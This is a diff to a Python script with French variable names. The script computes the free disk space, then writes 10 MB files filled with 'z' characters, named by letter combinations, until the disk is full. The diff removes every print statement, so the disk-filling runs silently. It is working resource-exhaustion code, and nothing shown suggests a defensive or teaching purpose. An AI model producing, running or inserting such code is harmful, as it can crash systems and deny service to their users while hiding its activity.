@@ -10,12 +10,11 @@ if not os.path.exists(dossier1):
     os.mkdir(dossier1)
 
 disk = psutil.disk_usage('/')
-print(f"Total: {disk.total / (1024*1024*1024):.2f} GB")
-print(f"Utilisé: {disk.used / (1024*1024*1024):.2f} GB")
-print(f"Disponible: {disk.free / (1024*1024*1024):.2f} GB")
+total = disk.total / (1024*1024*1024)
+Utilisé = disk.used / (1024*1024*1024)
+Disponible = disk.free / (1024*1024*1024)
 
 taille = int((disk.free / (1024*1024*1024))/0.010)
-print(int(taille))
 combinations = itertools.combinations(letters, 10)
 
 for combination in combinations:
@@ -23,7 +22,6 @@ for combination in combinations:
     txt = dossier + ''.join(combination) + ".txt"
     fichier = open(txt, "w+", encoding="utf-8")
     fichier.write("z"*10240000)
-    print(txt)
     if x > taille:
         break
 fichier.close()
